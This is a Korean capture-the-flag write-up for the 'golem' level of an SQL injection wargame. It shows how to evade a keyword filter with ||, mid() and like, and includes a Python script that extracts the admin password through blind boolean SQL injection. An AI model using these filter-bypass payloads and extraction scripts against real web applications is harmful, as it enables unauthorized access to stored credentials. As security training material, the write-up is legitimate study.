<img width="208" alt="스크린샷 2020-01-18 오후 7 06 48" src="https://user-images.githubusercontent.com/54495632/72662132-afc03900-3a26-11ea-959c-7c08b3f42214.png">

11번 골렘

<img width="663" alt="스크린샷 2020-01-18 오후 7 06 54" src="https://user-images.githubusercontent.com/54495632/72662134-b2229300-3a26-11ea-9ca6-f996dd684405.png">

if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 

pw에 or, and, substr, = 등의 기호가 오면 필터링된다.

or - || 로 대체한다.

and - &&로 대체할 수 있다. 해당 문제에서 and 자체를 사용하지 않았다.

subset - mid 함수로 대체 가능하다.

= - like를 이용했다.

$query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

쿼리상 where절 true이면 hello ~ 가 출력된다.

$_GET[pw] = addslashes($_GET[pw]); 
$query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
$result = @mysqli_fetch_array(mysqli_query($db,$query)); 
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 

그 전 문제에서 푼 구조이다. 알맞은 pw를 URL로 입력하게 되면 문제를 solve할 수 있다. 바뀐점이라면, substr과 = 이 필터링 됐을 때 어떻게 접근할 것인가에 대한 문제인 것 같다.

<img width="640" alt="스크린샷 2020-01-18 오후 7 21 36" src="https://user-images.githubusercontent.com/54495632/72662319-28c09000-3a29-11ea-869a-49d5319c813d.png">

<img width="632" alt="스크린샷 2020-01-18 오후 7 21 48" src="https://user-images.githubusercontent.com/54495632/72662323-2fe79e00-3a29-11ea-9c90-8b236ff08c21.png">

<img width="636" alt="스크린샷 2020-01-18 오후 7 22 31" src="https://user-images.githubusercontent.com/54495632/72662324-34ac5200-3a29-11ea-84a3-1c0d6985adb5.png">

URL과 쿼리를 다음과 같은 형식으로 주어 pw의 길이가 8임을 찾았다.

<img width="640" alt="스크린샷 2020-01-18 오후 7 38 02" src="https://user-images.githubusercontent.com/54495632/72662447-98834a80-3a2a-11ea-8fac-817c6c084b49.png">

mid 사용 자체는 substr과 같다.
ascii(mid(pw,1,1)) -> pw의 index 1부터 한 글자의 아스키 코드값 -> 55
다음과 같은 URL과 파이썬을 이용하여 문제를 해결할 수 있었다.

<img width="284" alt="스크린샷 2020-01-18 오후 7 39 32" src="https://user-images.githubusercontent.com/54495632/72662461-cff1f700-3a2a-11ea-84a1-7f48b247e039.png">

import requests

cookies={'PHPSESSID':'쿠키!'}
url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?"

pw=""
for i in range(1,9):
    for j in range(33,128):
        query="pw=%27||ascii%28mid%28pw%2C"+str(i)+"%2C1%29%29like%20"+str(j)+"%23"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Hello admin")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)

<img width="642" alt="스크린샷 2020-01-18 오후 7 40 05" src="https://user-images.githubusercontent.com/54495632/72662468-e435f400-3a2a-11ea-8ff7-84973c27c861.png">

 